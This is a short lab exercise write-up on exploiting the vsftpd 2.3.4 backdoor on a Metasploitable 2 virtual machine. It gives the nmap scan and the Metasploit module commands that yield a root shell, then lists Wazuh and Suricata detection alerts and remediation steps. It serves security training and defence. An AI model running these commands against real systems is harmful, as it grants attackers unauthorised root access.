# Attack Exercise — Metasploit vsftpd Backdoor

**MITRE ATT&CK:** T1190  
**Tool:** Metasploit Framework  
**Target:** Metasploitable 2 (10.10.10.30)

## Attack
```bash
# Scan target
nmap -sV 10.10.10.30

# Launch Metasploit
msfconsole

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.30
run

# Should receive root shell
whoami
```

## Detection (Wazuh)
- Suricata alert: ET EXPLOIT vsftpd backdoor trigger
- Wazuh process creation alert — unexpected shell spawned from vsftpd
- Source IP 10.10.10.5 (Kali)

## Evidence
Add screenshot of shell + Wazuh alert here

## Remediation
- Patch vsftpd to non-backdoored version
- Restrict FTP access with firewall rules
- Monitor for outbound connections from FTP service
